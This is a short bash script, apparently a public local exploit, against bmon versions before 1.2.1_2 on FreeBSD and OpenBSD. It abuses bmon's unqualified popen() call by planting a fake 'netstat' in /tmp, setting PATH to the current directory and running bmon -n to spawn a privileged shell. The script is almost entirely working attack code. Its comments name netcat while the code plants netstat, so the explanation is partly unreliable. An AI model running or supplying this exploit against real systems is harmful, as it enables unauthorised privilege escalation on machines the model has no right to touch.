#!/usr/local/bin/bash

# Written by Idan Nahoum. idanna@bk.ru
# local exploit for FreeBSD/OpenBSD with bmon < 1.2.1_2 installed.
# when bmon is executed with the -n parameter it popen()s netcat
# but fail to provide an absoluth path.
# some bsds are configured with acls that doesnt allow setuid files to
# run except those that are explicity allowed, so creating a file called
# netcat that chmod's +s bash wouldnt work, bash needs to run directly by
# bmon which uses ncurses, so to get a useable shell we need to redirect
# stdout to stderr (stdout is closed), and restore the stty settings.
# http://www.vuxml.org/freebsd/938f357c-16dd-11d9-bc4a-000c41e2cdad.html

declare -r SPATH="${PATH}"
declare -r STTY_EXEC=$(which stty)
declare -r STTY_SETTINGS=$(${STTY_EXEC} -g)
declare -r QSHELL="/usr/local/bin/bash"
declare    BMON_EXEC="/usr/local/sbin/bmon"

echo "$0 <path to bmon> [default: ${BMON_EXEC}]"

[ "$#" -gt "0" ] && BMON_EXEC="${1}"

[ -x "${BMON_EXEC}" ] ||
{
  echo "${BMON_EXEC} not found"
  exit
}

cd /tmp

# apparently bmon closes stdout, so we run a shell with stdout redirected
# to stderr.

cat > ./netstat <<EOF
${STTY_EXEC} ${STTY_SETTINGS}
PATH=${SPATH} /bin/sh 1>&2
EOF

/bin/chmod 755 ./netstat
echo "trying to exploit"
PATH=./ "${BMON_EXEC}" -n
